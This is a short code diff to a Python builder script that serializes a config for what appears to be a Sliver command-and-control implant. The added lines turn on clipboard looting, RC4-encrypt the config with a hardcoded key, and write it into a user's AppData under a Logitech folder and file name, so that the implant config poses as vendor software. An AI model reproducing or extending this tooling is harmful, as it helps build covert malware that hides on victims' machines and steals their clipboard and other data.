@@ -2,6 +2,7 @@ from protobuf import config_pb2
 from hexdump import hexdump
 import sys
 import json
+from Crypto.Cipher import ARC4
 
 if len(sys.argv) != 2:
     exit(-1)
@@ -18,9 +19,10 @@ config.SliverName = data['SliverName']
 config.ConfigID = data['ConfigID']
 config.PeerAgePublicKeySignature = data['PeerAgePublicKeySignature']
 config.EncoderNonce = data['EncoderNonce']
-config.MaxFailure = data['MaxFailure']
+config.MaxConnectionErrors = data['MaxConnectionErrors']
 config.ReconnectInterval = data['ReconnectInterval']
 config.SliverPath = data['SliverPath']
+config.LootClipboard = data['Clipboard']
 config.Loot = data['Loot']
 
 config.Protocol = data['Protocol']
@@ -77,5 +79,9 @@ for cfg in data['PivotConfigs']:
 
 marshaled_data = config.SerializeToString()
 hexdump(marshaled_data)
-open('.\\x64\\Debug\\logitech.cfg', 'wb').write(marshaled_data)
+cipher = ARC4.new(b'config_key')
+ciphertext = cipher.encrypt(marshaled_data)
+hexdump(ciphertext)
+open('.\\x64\\Debug\\logitech.cfg', 'wb').write(ciphertext)
+open('C:\\Users\\Admin\\AppData\\Roaming\\Logitech\\logitech.cfg', 'wb').write(ciphertext)
 f.close()
